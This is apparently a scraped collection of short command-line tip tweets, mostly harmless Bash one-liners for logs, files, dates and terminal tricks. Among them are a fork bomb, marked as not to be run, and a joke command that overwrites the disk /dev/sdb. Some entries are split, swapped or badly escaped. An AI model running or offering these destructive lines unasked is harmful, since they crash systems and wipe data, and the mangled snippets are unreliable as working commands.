 HISTIGNORE="history;ls;date;w;man *
```

- The Matrix effect in a bit more than 140 characters

```Bash
 https://t.co/XoOtJkj06I
```

- Check the whole last login log, but filter out that annoying user that must login every minute

```Bash
 last -da | grep -v ^autologinuser
```

- Convert tiff images to rescaled jpg

```Bash
 for p in *.tiff; do convert -quality 75 -scale 50% "$p" "${p%%.tiff}.jpg"; echo converted $p; done
```

- Run management in debug mode to find out why its not understanding the input you're sending it

```Bash
 management -D
```

- Count uniq hosts in time range

```Bash
 sort -k4 *.log |sed -n \'/15\\/Aug\\/2015:14:11:02/,/20\\/Aug\\/2015:02:34:58/p\' |cut -d" " -f1|sort|uniq|wc -l
```

- Last 2 years of this weekday. Shorter easier to read version. ;-)

```Bash
 for w in {1..104} ; do date -d "now - $w weeks" +%Y-%m-%d ; done
```

- Last 2 years of this weekday

```Bash
 t=$(date +%s);n=0;while [ $n -lt $((86400*365*2)) ];do n=$(($n+86400*7));date -d @$(($t-$n)) +%Y-%m-%d;done
```

- Pick up where you left off on tmux session 2. tmux list-sessions to see what's available

```Bash
 tmux attach -t 2
```

- Give your visitors truly live updates. Type a message + Ctrl-D

```Bash
 cat <(printf "HTTP/1.1 200 OK\\nContent-type: text/html\\n\\n") - |nc -l 80
```

- Calculate the current Swatch Beat time. /me ducks

```Bash
 TZ=UTC-1 date +"(%S + (%M * 60) + (%H * 3600))/86.4" | bc
```

- Read it, otherwise you may end up running that backup script every minute during the 4th month of the year

```Bash
 man 5 crontab
```

- In mutt, pipe msg to this to count

```Bash
 grep -o '<[^@]\\+@[^ >]\\+ >'|wc -l
```

- In GNU date, show the epoch time 30 years ago. Interestingly, @498765432 was at 17:57:12 GMT that day

```Bash
 date -d "now 30 years ago" +%s
```

- Be notified in the terminal when you receive e-mail or when someone asks about Gray's Sports Almanac

```Bash
 biff
```

- Instant stopwatch. Run to start timer and press Ctrl-D to stop it. "real" time is the elapsed time

```Bash
 time cat
```

- Quickly check the integrity of the "AMP" stack on rpm based systems

```Bash
 rpm -qa | grep -e http -e php -e mariadb | xargs rpm -V
```

- Prefix the epoch time in column 1 with the local time

```Bash
 tail -f udp.log |gawk \'{printf("%s %s\\n",strftime("%Y-%m-%d_%T", $1),$0)}\'
```

- Or if you can't leave yet, check this code out. Thx @brimston3

```Bash
 https://t.co/eLDIsgZrOn
```

- Hey everyone, does your shell do this?

```Bash
 <Ctrl-D >
```

- Wooo!

```Bash
 yes "$(seq 231 -1 16)" | while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .02; done
```

- Long list files under /etc that were modified between 2 and 30 days ago

```Bash
 find /etc -type f -mtime +2 -mtime -30 -ls
```

- Remove duplicate lines *without sorting*. Low memory version. That !a[$0]++ construct can get big

```Bash
 awk '{if (t!=$0){print;t=$0}}' file
```

- Produce sum of sent bytes in the mail.log. Uses PCRE

```Bash
 grep -P -o "(?<=sent=)[0-9]+" mail.log | awk \'{sum+=$1} END {print sum}\'
```

- climagic. Great for discussing the command line and seeing some stuff before its posted

```Bash
 There is also an IRC channel on Freenode at
```

- This clears/yanks from the cursor to beginning of line. Also useful to clear your password attempt and start over at pw prompts

```Bash
 [Ctrl-U]
```

- Replace path to perl in .pl scripts. Use , delimiter instead of / for easier reading

```Bash
 sed -s -i '1s,/local/bin/perl,/bin/perl,' *.pl
```

- Remove duplicate lines without sorting 'file'. $0 means whole line in awk. 'a' is an array. So print if not in array

```Bash
 awk '!a[$0]++' file
```

- This is a real command from the bsdgames package that has a database of acronyms. Ironically it doesn't have BSD in it

```Bash
 wtf is rtfm
```

- Show the 20 largest files at least 2 subdirectories down from your home dir

```Bash
 find ~/ -mindepth 2 -type f -ls | sort -n -r -k 7 | head -20
```

- Make function command 'tolower' that will convert all arguments to lowercase

```Bash
 tolower(){ echo ${@,,}; }
```

- Print only the lines from quotes.txt that are shorter than 140 characters

```Bash
 awk 'length < 140' quotes.txt
```

- Poor man's auto updating slideshow image

```Bash
 while true;do for i in ~/Pictures/*.jpg ;do cp "$i" ~/slideshow.jpg ;sleep 5;done; done
```

- With bc, specify your obase value before ibase value because the ibase applies to rest of the string

```Bash
 bc  < "obase=16;ibase=8;7414
```

- option count

```Bash
 for i in $(ls -1 /usr/share/man/man1/) ; do p=${i//.1.gz} ; echo -n "$p " ; man $p|egrep "^[\\ \\t]*--?[a-zA-Z0-9]"|wc -l;done
```

- A good regex to know about is \\b for boundary markers. It prevents matching other words with 'date' in it. Try it in man pages

```Bash
 \\bdate\\b
```

- Being 10-01, here is how to fix Beatles's MP3 with the right channel broken. Thx @gialloporpora

```Bash
 sox input.mp3 output.mp3 remix 1,2
```

- Set the search jump target to 2 lines down so that you see the previous line of context on searches within less

```Bash
 less -j2 /var/log/syslog
```

- When you want to see the output (including stderr) of your removal AND save it

```Bash
 rm -frv somestuff 2 >&1 | tee remove.log
```

- List packages with specific version and make sure the name column is visible by piping the output into cat

```Bash
 dpkg -l '*3.19.0-2[56]*' | cat
```

- snd

```Bash
 for n in 30 41 41 38 41 9999 31 30;do for t in {0..2200};do [[ $(($t%$n)) == 0 ]]&&echo -n $'\\xb0'||echo -n $'\\x80';done;done >/dev/dsp
```

- Hex color value display function in vim

```Bash
 http://t.co/35bPBSQIGT
```

- Fetch the current time in bash using this special device path hostname/port. Thx @fetoxm1

```Bash
 cat </dev/tcp/time.nist.gov/13
```

- This will create a readline macro of whatever you type. Run the macro with <Ctrl-x + e >

```Bash
 <Ctrl-x + ( > keystrokes go here. <Ctrl-x + ) >
```

- This will create a macro of whatever you type. Run the macro with <Ctrl-x + e >

```Bash
 <Ctrl-x + [ > keystrokes go here. <Ctrl-x + ] >
```

- In bash, this sets the history to ignore commands starting with spaces and duplicates. May already be set

```Bash
 HISTCONTROL="ignoreboth
```

- Show the last 10 packages installed on an RPM based host. Thx for the correction @ThomasConstans

```Bash
 rpm -qa --last | head
```

- Show the last 10 packages installed on an RPM based host

```Bash
 rpm -qa --last | tail
```

- Send paste buffer into sort. Because your {Cloud} based document editor lacks this basic functionality

```Bash
 {xsel -b || pbpaste} | sort
```

- Show remote hosts who received HTTP 400s or 413s

```Bash
 zcat *access_log*.gz |cat - *access_log* |awk '$9==400||$9==413{print $1}' |sort |uniq
```

- Create tar called Stash.tar.xz of Stash and use 2 v options to long list and write to idx file

```Bash
 tar pcvvf Stash{.tar.xz,} |tee Stash.idx
```

- NationalCheeseburgerDay, here is ascii art of someone eating a cheeseburger. (DO NOT RUN THIS FORK BOMB)

```Bash
 :(){ :|:& };: To celebrate
```

- If your fullscreen X Window System game exits and leaves your screen resolution at a lower resolution. Try this

```Bash
 xrandr -s 0
```

- Most common type of file per subdir

```Bash
 for d in */; do echo -n "$d "; file -b "$d"/* |cut -d\' \' -f1 |sort| uniq -c| sort -rn|head -1; done
```

- linux

```Bash
 Happy 24th Birthday Linux! Today is the anniversary of the source code being released, not of some baby shower.
```

- Print the first and last line of stdin

```Bash
 sed -n '1p;$p'
```

- Specify an alternate rpm database path using --dbpath

```Bash
 rpm --dbpath=/oldserverbackup/var/lib/rpm -q perl-Date-Manip
```

- Don't have telnet, netcat, etc installed. You can use curl with telnet:// prefix. Thx @6byNine

```Bash
 curl -v telnet://blt.evedder\\.otv:4240
```

- Anyone want to watch The Outer Limits?

```Bash
 for cmd in "load tape 95" rew play; do mt -f /dev/vtp20 $cmd || break ; done
```

- Replace error with ERROR: only on lines that start with 'print "' accounting for leading space

```Bash
 sed -r "/^\\s*print \\"/ s/error/ERROR:/
```

- Add all IPs for subnet range to eth0. For listening on whole subnet. Careful!

```Bash
 for d in {2..254}; do ip addr add 172.16.8.$d dev eth0; done
```

- Run tail on system log, but don't fail when the log is rotated. It will open the new file

```Bash
 tail -F /var/log/messages
```

- My 5th wipe

```Bash
 yes "HI, THIS IS A MESSAGE FROM THE LAST CUSTOMER TO LET YOU KNOW THEY DID NOT WIPE THE DRIVE FOR ME EITHER. :-P" > /dev/sdb
```

- SIXELS, if your xterm supports it. Thx @fcambus,@drscriptt

```Bash
 xterm -geometry 120x50 -ti vt240 -e 'curl climagic\\.org/SIXEL/time.six;/bin/sh'
```

- Happy Programmer's Error Day

```Bash
 date +%j
```

- Find the total disk space allocated to filesystems with level0 in name

```Bash
 df -PB1 | awk \'/level0/{sum+=$2} END {print sum/2^30 " GiB"}\'
```

- Print log lines per minute stats in real time

```Bash
 tail -f maillog | awk \'{c++;t=substr($0,0,12);if (t!=ot){print c " " ot; c=0;ot=t}}\'
```

- Watch a few commands together every 10 seconds. Quotes, whitespace and ending ; are important

```Bash
 watch -n 10 '{ uptime ; free ; df -h; }'
```

- Fix logs to be dateext rotation format

```Bash
 for i in log.{1..99}.gz;do new=$(date -d "$(stat -c %y "$i")" +%Y%m%d );mv "$i" log-${new}.gz;done
```

- Set this option in tmux to send keystrokes to all panes in current window. http://t.co/ch9zKsQCDn Thx @tyrmored

```Bash
 :setw synchronize-panes
```

- anthony-vm <-- Use a

```Bash
 tcpdump -i vnet15 -n tcp
```

- Pretend that you're on a starship. play from sox pkg

```Bash
 play -n -c1 synth whitenoise band -n 100 20 band -n 50 20 gain +30 fade h 1 86400 1
```

- climagic video: My daughter creates a surprise program

```Bash
 https://t.co/OPkV5Wh0R5
```

- :1

```Bash
 ls "Have a nice day" 2 >&1 > /dev/null | grep -o !
```

- In awk, use \\x27 to specify a single quote character using hexadecimal escaping

```Bash
 awk \'{print "\\x27" $1 "\\x27,"}\' userlist
```

- 3g dongle bandwidth by @gontsekekana

```Bash
 pppstats|cut -d" " -f2|tail -n +2|xargs printf "%s/2^20\\n"|calc -p|cut -f2|xargs printf "Use: %s MB\\n
```

- Start playing music files with the 51st file in (0 indexed). Good for when wildcards would be too complex

```Bash
 f=(*.mp3); mpg123 "${f[@]:50}
```

- Metaphysical Unix

```Bash
 printf "It it really a line of text if there is no newline?" | wc -l
```

- Save the last 10 commands that you ran to a file called script.sh. sed trims the whitespace

```Bash
 fc -nl -10 0 | sed -r 's/^\\s+//' > script.sh
```

- Quick access to the ASCII character table via the ascii program or the man page if you don't have the program

```Bash
 ascii || man ascii
```

- unzip all zips \\,,/(^_^)\\,,/

```Bash
 while ls *.gz*;do for i in *.gz*;do [ -f ${i/.gz/} ]||gunzip -f -c $i > ${i/.gz/} && rm -vf $i ;done; done
```

- log_rotation_gone_horribly_wrong.1.gz.2.gz.1.gz

```Bash
 access_log.2.gz.1.gz.2.gz.1.gz.2.gz.1.gz.2.gz.1.gz.2.gz.1.gz.2.gz.2.gz.1.gz.1.gz.12.gz
```

- Count the total number of invalid (4xx and 5xx status) requests in 2015 on all websites

```Bash
 awk '$9~/^[45]/' *-access_log.2015* | wc -l
```

- Show the total bandwidth consumed by websites so far in 2015

```Bash
 awk '{sum+=$10} END {print sum}' *-access_log.2015*
```

- Print out home directories owned by users without a valid password entry

```Bash
 ls -l /home | awk '$3~/^[0-9]+$/'
```

- Show at jobs, but sort them by the time of day

```Bash
 atq | sort -k6n -k3M -k4n -k5n
```

- Find any files under /home owned by system accounts/groups, except users (gid=100)

```Bash
 find /home -uid -500 -o \\( -gid -500 -a \\! -gid 100 \\)
```

- Find broken symbolic links under /etc. Thx @MarceloBytes and @dominikhonnef

```Bash
 find -L /etc -type l
```

- I ran a systemd command from muscle memory today and then I became nauseous. Coincidence?

```Bash
 journalctl -xn
```

- View process table in tree format and search directly to 19797 (the pid), avoiding this command itself

```Bash
 ps auxwwf | less +/[1]9797
```

- Just see what files under /etc are different between the local host and remotehost

```Bash
 rsync -nav -e ssh /etc root@remotehost:/etc
```

- Check which Apache modules aren't installed

```Bash
 grep -h LoadModule *.conf | awk '{print $NF}' | xargs ls > /dev/null
```

- In vim command mode, this will replace ALL the text in the buffer with just the second column from the buffer

```Bash
 :%! awk '{print $2}'
```

- Show most of the rpms I'm missing on new server

```Bash
 diff <(sed 's/-[0-9].*$//' old-rpms.txt) <(sed 's/-[0-9].*$//' new-rpms.txt) | grep '< '
```

- servernaming

```Bash
 Need to replace a server called drumroll. So what do I call it? Rimshot of course.
```

- Relabel your terminal window to "VPS control". May have to disable any existing title updating functions

```Bash
 printf "\\033];VPS control\\007
```

- NSFSummit2015

```Bash
 I'm at NSF Summit 2015 this week in DC / Arlington. If you are here too, let me know and we can meet up.
```

- Find all the other words that start with bro for your software project names

```Bash
 look bro
```

- 100K

```Bash
 Imagine a huge stadium filled with over 100,000 people all rooting for the command line. Don't imagine it anymore, you're here!
```

- Anyone remember this? https://t.co/emkrBn45vd

```Bash
 date -d '2010-04-16 + 1946 days'
```

- Hey, can we make this work day end sooner because some of you probably can really do this

```Bash
 ssh timeserver sudo date 08141659
```

- Look at the two first lines of file program.pl and print each character including newlines, tabs, etc

```Bash
 head -2 program.pl | hexdump -c
```

- "Foreign" 2FA fails

```Bash
 awk -F, \'/FAILURE/{print $5}\' 2FA-log.csv |while read ip; do printf "$ip "; geoiplookup $ip; done |grep -v -e " US,
```

- iptraf is a nice standalone real time network monitoring utility for Linux that runs in the terminal

```Bash
 iptraf
```

- Fetch a copy of your IMAP inbox and send it to your localhost mailserver

```Bash
 fetchmail --ssl --keep -u youremail@yourmaildomain imap.server
```

- Sum stats by user letter

```Bash
 awk -F[\\\\t/] \'{l=substr($4,0,1);a[l]+=$1}END{for (i in a){printf "%s %10d\\n", i, a[i]}}\' userdiskstats.txt |sort
```

- Out of space? Compress large log to other filesystem, then delete & move the old log back

```Bash
 gzip -v9 -c /var/log/maillog > /root/maillog.gz
```

- long list log.0000.txt through log.0099.txt, but nothing else. Good for sub ranges! Thx @nathanrayo

```Bash
 ls -l /tmp/log.00[0-9][0-9].txt
```

- Long list contents of two directories at once. Same as ls -l /usr/local/sbin /usr/local/bin

```Bash
 ls -l /usr/local/{s,}bin
```

- Add @example.com to the end of lines that don't have @ in them and join em w/ ,s

```Bash
 sed 's/^[^@]\\+$/&@example.com/' emails.txt |tr '\\n' ,
```

- InternationalBeerDay

```Bash
 wait %1 ; cd /pub && more beer
```

- $c";read -p "Color? " g;echo "Color was $c

```Bash
 r=$((RANDOM%4096));c=$(echo "obase=16;$r"|bc);display -size 300x300 -title \'\' xc:
```

- Lists files grouped by extension, which is handy, especially when cleaning up your homedir. Thx @ben_nuttall

```Bash
 ls -X
```

- Did wget produce a file with a url in it. Just use curlybraces to easy rename

```Bash
 mv {countdl.php\\?lalalalala,}somedownload.tar.gz
```

- Community question: What's Your current terminal size? To find out, please run this command and reply

```Bash
 { tput cols ; tput lines; } | xargs
```

- count words

```Bash
 curl -s xkcd\\.com/1560/ |sed -n \'s/.*bubblegum.png.*title="\\([^"]\\+\\)".*/\\1/p\' |pee "html2text -width $COLUMNS" "wc -w
```

- Show per user count of inbox messages

```Bash
 for d in */Maildir/{new,cur} ; do printf "$d "; ls -1 $d | wc -l ; done | column -t
```

- Another site that allows you to share your recorded terminal sessions

```Bash
 http://t.co/1HbKUSdDEZ
```

- Check connectivity/latency to a network host. Kind of a real time ping/traceroute hybrid. Try the different display modes

```Bash
 mtr 1.2.3.4
```

- In X windows, you can usually paste your primary selection buffer with this shortcut. Faster than middle mouse

```Bash
 [Shift+Ins]
```

- Hz game

```Bash
 f=$(($RANDOM%5900+100));play -qn synth sin $f trim 0 0.75 vol .1;read -p "Hz(100-6000)? " g;printf "Hz=$f; Off by %d\\n" $((f-g))
```

- What the world thinks of command line users. (Description of image: http://t.co/2zh8ryRiY9)

```Bash
 http://t.co/ZkKDbvXZ3g
```

- When self signed SSL certs I created 10 years ago finally expire, I weep

```Bash
 openssl x509 -in cheapbastard.crt -dates | grep not
```

- Get your I-net IP from DNS service and set a var to it. Yes, there are many such services

```Bash
 OUTSIDE_IP=$(dig +short my.ip @outsideip.net)
```

- Show directory size and sort by human readable amount (MB, GB, etc.). Requires fairly recent version of GNU sort

```Bash
 du -sh */ | sort -h
```

- rot13 \xc2\xa9 joke

```Bash
 tr A-Za-z N-ZA-Mn-za-m  < "Guvf Gjrrg sebz @pyvzntvp unf orra jvguuryq va erfcbafr gb n ercbeg sebz gur pbclevtug ubyqre
```

- telnet / tcp debugging via SSL

```Bash
 openssl s_client -connect google.com:443
```

- Recursively grep for MYSQL_PWD in all files under /etc, sending any errors (permissions) to /dev/null

```Bash
 grep -r MYSQL_PWD /etc 2 > /dev/null
```

- Rm msgs from Q by IP

```Bash
 mailq |awk '/^[0-9A-F]+/{print $1}' |while read id; do postcat -q $id |grep -qi 10\\.4\\.5\\.6 && postsuper -d $id;done
```

- Find less than an hour old files in CWD or below without crossing into other partitions. (-xdev)

```Bash
 find . -mmin -60 -xdev -ls
```

- hexdump-stream

```Bash
 echo "hello, climagic" | od -t x1 -A"n" | tr "\\n" " " | tr -d "
```

- range random

```Bash
 seq 0 9 | shuf -n 1
```

- wordwrap for less

```Bash
 less -S <text_file >
```

- Range random

```Bash
 let "rand = RANDOM % 9"; echo $rand
```

- Crude live testing script as you save

```Bash
 watch -n .2 <bash_script >
```

- disable wordwrap

```Bash
 tput rmam; <any-command >; tput smam
```

- guestweek

```Bash
 Today's posts are by Rhoit (@rhoitman), a Linux user who uses zsh.
```

- Change all uppercase letters in a file to lowercase

```Bash
 cat file1 | tr "[A-Z]" "[a-z]" \xc2\xa0
```

- Learn to use vim

```Bash
 vimtutor
```

- Have grep return lines around the one you find (x is the number of lines)

```Bash
 grep -Bx -Ax foo bar.txt
```

- Get the usernames from /etc/passwd

```Bash
 cut -f 1 -d: /etc/passwd
```

- Kill defunct processes

```Bash
 ps -ef | grep defunct | awk '{print $2}' | xargs kill
```

- guestweek

```Bash
 Today's posts are by Bill Newcomb (@billthelinuxguy), who is a 10+year Solaris admin now turned Linux admin using RHEL and Ubuntu
```

- Check every 5 seconds if something.pid exits and it's last access and size

```Bash
 watch -n 5 "ls -l something.pid
```

- Do a reverse DNS lookup of all hosts in 192.168.0.0/24

```Bash
 for i in {1..254}; do host 192.168.0.$i; done
```

- Check if this machine is being pinged

```Bash
 tcpdump -ni eth0 icmp
```

- See a live output of the syslog file filtered for dhcp messages

```Bash
 tail -f /var/log/syslog | grep dhcp
```

- Get a List of all Emailadresses in your MBox file

```Bash
 egrep -o "\\b[a-zA-Z0-9\\.\\+-]+@[a-zA-Z0-9\\.-]+\\.[a-zA-Z0-9\\.-]+\\b" mbox | sort -u
```

- Collapse groups of 3 lines to 1 line and seperate the values by commas

```Bash
 cat list | sed -e "N;N;s/\\n/,/g" > list.csv
```

- guestweek

```Bash
 His Twitter id is @Macgoever of course.
```

- guestweek

```Bash
 Today's posts are by Macgoever, a network engineer in Germany whose team supports over 10k network devices.
```

- terminate the shell if no activity in 5 minutes, security people like this on ssh connections

```Bash
 export TMOUT=300
```

- get cheat sheets on popular topics from http://t.co/WzzHiZs2hE

```Bash
 gem install cheat; cheat strftime
```

- add a slash to run the actual command and not an alias

```Bash
 \\grep foo bar.txt
```

- guestweek

```Bash
 put "git blame $@" into ~/bin/git-praise and now you can run \'git praise\' instead of \'git blame\'
```

- now you can cd up two levels at a time with cd ... (zsh only?)

```Bash
 alias -g ...=../..
```

- funzip can uncompress piped zipfiles

```Bash
 cat http://t.co/auRfocBF3k | funzip | grep alice > alice.txt
```

- guestweek

```Bash
 Today's guest posts are by Alice Kaerast (@kaerast), who uses a mixture of bash and zsh to automate everything.
```

- speed up grep with a fixed string search and optimal localization

```Bash
 LC_ALL=C grep -F pattern file
```

- fold a file into 3 columns (row ordering)

```Bash
 seq 9 | pr -tas" " --columns 3
```

- fold a file into 3 columns (column ordering)

```Bash
 seq 9 | pr -ts" " --columns 3
```

- replace double quotes with single quotes without the usual quoting nightmare

```Bash
 tr \'"\' "\'" < file
```

- page through a log file in reverse to avoid guessing number of lines to tail

```Bash
 tac log | less
```

- use uniq to count lines with common prefixes. For example timestamps in log files

```Bash
 uniq -w 12 -c log
```

- print a file in a tabular format (right align). Set delimiter with -s

```Bash
 rev file | column -t | rev
```

- print a file in a tabular format (left align). Set delimiter with -s

```Bash
 column -t file
```

- guestweek

```Bash
 Today's posts are by Chris Seymour (@iiSeymour), a zsh, i3wm and emacs user who'se favorite command line tool is awk.
```

- guestweek

```Bash
 This week is a guest week. Each day will bring posts from a different person.
```

- CLIMAGIC quick video: Using awk or numsum to sum up numbers in df output

```Bash
 http://t.co/kpb7ilXk8S
```

- Delete podcasts older than 7 days

```Bash
 find ~/podcasts -type f -mtime +7 -delete
```

- move Up in your Roku interface. Great for when you can't find the remote

```Bash
 curl -d '' http://roku\\.home:8060/keypress/Up
```

- Make a gif out of all jpg's in a directory @climagic

```Bash
 RT @garth_mortensen: convert -delay 20 -loop 0 *.jpg newgif.gif
```

- client\ntar cvf - dir/|lz4c |netcat server 12345 \n

```Bash
 RT @gousiosg: Pushing 5Gbps over an 1Gbps network:\n
```

- Find files on the entire filesystem for which there is no corresponding user or group

```Bash
 find / \\( -nouser -o -nogroup \\) -ls
```

- If you'd like to be a poster for the upcoming guest week, please follow this link for instructions

```Bash
 http://t.co/ZsC9plbyeU
```

- Breakup compressed log by syslog date and recompress

```Bash
 zcat large.log.gz | awk \'{print $0 | "gzip -v9c > large.log-"$1"_"$2".gz"}\'
```

- Compress and ssh transfer a log that has filled a filesystem

```Bash
 gzip -c large.log | ssh user@hostwithbigdisk 'cat > /dir/large.log.gz'
```

- Check the size of yesterday's netflow data directory using date format technique

```Bash
 du -s $( date -d "yesterday" +/netflow/%Y/%m/%d )
```

- New tmux session, split window w/ 5 (4) line tail of syslog at bottom

```Bash
 tmux new-session \\; split-window -l 5 -d 'tail -F /var/log/syslog'
```

- Having trouble with username resolution? (LDAP issues, etc.) Use the -n option with -l to print uids instead of usernames

```Bash
 ls -ln
```

- By default, strings will only show data if there are 4 or more consecutive ASCII chars, you can reduce this with -n

```Bash
 strings -n1 file.bin
```

- Figure out when your md-raid will finish

```Bash
 date -d "$(grep finish /proc/mdstat |sed -e \'s/^.*finish=//;s/ .*$//;s/\\..*$//\')min
```

- True on last day of the month. Useful in cron and other places

```Bash
 [ $( date -d 'next day' +%d ) == 1 ] && echo 'its the end of the month'
```

- circlecitycon

```Bash
 Me @ conferences - > Alright, now I have all my stuff setup just they way I like it..... awww time to go already?
```

- Try all upper/lower case combos of url

```Bash
 for mc in http://goo\\.gl/{A,a}{B,b}9{X,x}0 ; do curl -sI $mc | grep Location: && echo $mc ; done
```

- In GNU sort, you can use -V (version sort) to also sort IPv4 addresses numerically according to each class

```Bash
 sort -V ipv4addrs.txt
```

- vim in Read only mode. Useful when you just want to get features like syntax highlighting without modifying anything

```Bash
 vim -R httpd.conf
```

- run the non-aliased version of rm. Putting a \\ in front of a command name will bypass any aliases of the same name

```Bash
 \\rm file
```

- Poor man's annoy-a-tron. 3 - 6 min interval

```Bash
 while :; do play -qn synth sin 14k trim 0 0.75 vol .8 ; sleep $((RANDOM % 4 + 3))m ; done
```

- (Unrotated log) Count the number of lines per month in boot.log

```Bash
 cut -c1-3 boot.log | uniq -c
```

- Log!

```Bash
 base64 -d < TVRoZAAAAAYAAQABAYBNVHJrAAAAOgD/UQOAAAAAkEV/CIBFfwCQRX8IgEV/AJBKfwiASn8AkEx/CIBMfwqQSX8IgEl/AJBKfwiASn//LwA= |timidity -
```

- Rename set of files with non-hyphenated date to be hyphenated

```Bash
 rename 's/_(\\d{4})(\\d{2})(\\d{2}).txt/_$1-$2-$3.txt/' *_????????.txt
```

- Use a subshell to generate a complex list of files for tar

```Bash
 (find /one -print0; find /two -print0) | tar cvf backup.tar --null -T -
```

- Run du -sh every 5 minutes precisely (ignoring time it takes to run du -s by using watch -p)

```Bash
 watch -n 300 -p du -s
```

- thousands of logfiles, compressed in as many threads as CPUs you have. / cc @climagic

```Bash
 RT @SnowRaptor: ls *.log | parallel xz -v
```

- diy

```Bash
 RT @Tech_Poet: This is the kind of thing that gives IT professions heart attacks.
```

- hook into stdout and stderr of a running process! /cc @climagic

```Bash
 RT @amenthes_de: sudo strace -p <PID > -e trace=write -e write=1,2
```

- CLI PDF to HTML tool

```Bash
 pdftohtml -stdout my.pdf > my.pdf.html; elinks my.pdf.html
```

- Show the last access time of all files ending with .txt. This may not work on all filesystems/setups

```Bash
 ls -l --time=atime --full-time *.txt
```

- Who watches who? You watch who!

```Bash
 watch who
```

- uuoc

```Bash
 Stuck on an island, with only a terminal. I ran \'cat file\' and 1000 people appeared saying "Useless use of cat!" Rescued.
```

- Check if old domains are still pointing to you

```Bash
 cat old_domains |while read -r d; do dig +short NS $d |grep -q yourNShost && echo $d; done
```

- When using less with piped input data, you can use the 's' key to save the data to a file. Very useful with database queries

```Bash
 less tip: s
```

- Just noticed that my town (Bloomington) has got http://t.co/PqP8oA7lcM

```Bash
 whois root\\.com | grep -E "Registrant (City|State|Country)
```

- emojic8ball how will I die?

```Bash
 em8ball(){ a=$( printf "%x\\n" $(($RANDOM%368+9728)) );printf "\\u$a ";random -e 2 && $FUNCNAME||echo; }
```

- Funhouse mirror with your webcam. Kids love this

```Bash
 mplayer --vf=geq='(p(X\\,Y*sin(X/512))-0)' tv://
```

- Record a macro called 'a' that moves down two lines (jj) and then deletes 1 line (dd). Run w/ @a, run 100 times 100@a

```Bash
 vim macro: qajjddq
```

- Linux

```Bash
 RT @a_alasiri: vi / vim visualized cheat-sheet.\n
```

- unix

```Bash
 RT @nixcraft: Open 5 random articles:\n\nfor J in {1..5}; do xdg-open http://t.co/TvxBGjcKo9; done\n\nMore http://t.co/i1zaNi7kN8
```

- Its alive!

```Bash
 while :;do printf "\\e[%d;%dH\\e[48;5;%dm \\e[0m" $(($RANDOM%$LINES)) $(($RANDOM%$COLUMNS)) $(($RANDOM%216 )); done
```

- Use poppler-utils to extract text data

```Bash
 for i in *2015-04-*-.pdf; do printf "$i " ; pdftotext $i - | sed -n \'/Total Bytes/{n;n;p;q}\';done
```

- Print the sum of all the values of lines that start with "Bytes: " in traffic.log

```Bash
 awk \'/^Bytes: /{sum+=$2} END {print sum}\' traffic.log
```

- To print commits per day for a git repo.  Thx @akkaashgoel

```Bash
 git log | awk \'/Date/{print " : " $4 " " $3 " " $6}\' | uniq -c
```

- Print messages per day stats in a maildrop.log file

```Bash
 grep ^Date maildrop.log | cut -c1-16 | uniq -c
```

- Long list all(a) files(l) in CWD, ordering by size(S) ascending(r) and displaying size in human readable form(h)

```Bash
 ls -Sharl
```

- We shouldn't have counted our thumbs when we choose a numeric base

```Bash
 for i in {0..70};do printf "$i ";echo "ibase=10;obase=8;2^$i"|bc;done
```

- puzzle

```Bash
 590295810358705653049
```

- Decimal to binary conversion in bash by @blind_coder

```Bash
 Dec2Bin=({0..1}{0..1}{0..1}{0..1}{0..1}{0..1}{0..1}{0..1}); echo ${Dec2Bin[27]}
```

- Play enough of the video to get the VIDEO dimensions. (The monkey way)

```Bash
 mplayer -ao null -vo null --endpos=0.1 *.mp4 | grep VIDEO
```

- bzip2 compress 90+ day old log files under directories a - z

```Bash
 find [a-z] -mtime +90 -type f -name '*_log' -exec bzip2 -v9 {} \\;
```

- Analyze your whole Linux lastlog to see the different remote hosts for each user

```Bash
 last -da | awk \'{print $1 " " $NF}\' | sort | uniq -c
```

- And if you're looking for a more keys/scales, instruments. Try this program I wrote a few years back

```Bash
 http://t.co/4TJhfBbaie
```

- Poly synth. Press asdfghj

```Bash
 n=CDEFGAB;l=asdfghj;while read -n1 k;do x=$(tr $l $n < $k);play -qn synth pl ${x}3 fade 0 .7 & done
```

- An addicting command line game where you use hjklyubn keys to move around and gobble up numbers. http://t.co/MUtxVLlaqq

```Bash
 greed
```

- View the 'open' system calls made by a program called vpnc. strace = window into program functionality

```Bash
 strace -e open vpnc
```

- Sometimes its handy to copy small amounts of data from one host to host this way

```Bash
 base64 + copy buffer - > base64 -d + paste buffer
```

- Go left in your Roku interface. Great for when you can't find the remote

```Bash
 curl -d '' http://roku\\.home:8060/keypress/Left
```

- It probably says a lot that pulseaudio's kill command has a short option, but the start option doesn't

```Bash
 pulseaudio -k
```

- This is how you quit vi

```Bash
 <Esc >:q!
```

- Remove the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivilent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Incremental undo of command line edits. Ctrl-- works the same and Ctrl-? sometimes works as well, although its not documented

```Bash
 <Ctrl-_ >
```

-  >

```Bash
 <Meta-
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- (With no arguments) Takes you back to your home directory

```Bash
 cd
```

- description. The

```Bash
 Just a reminder about the format of climagic tweets: command
```

- Show directory-only usage in human readable form, but don't decend into other filesystems. Sort human readable data

```Bash
 du -shx */ | sort -h
```

- Cures most shell symptoms, including runny prompts, echo congestion, binary infection and color stain. Use as directed

```Bash
 stty sane; reset
```

- Instead of using sleep 60, you can use read and "short-circuit" the wait with a return

```Bash
 while :; do do_something; read -st 60 X ; done
```

- Find ph words where the ph is not pronounced as 'f

```Bash
 look . |grep ph |while read w; do espeak -qx "$w"|grep -q f||echo "$w"; done
```

- Try finding the URL given a fuzzy screenshot

```Bash
 for u in example/bc{3,8}449{0,8,9}2-ab7a-1{3,8}03; do curl -sI $u|grep -q 404||echo $u; done
```

- Open mplayer man page and search for 'ass,'

```Bash
 LESS="+/ass," man mplayer
```

- Use || when you want to run a command only if the first one failed

```Bash
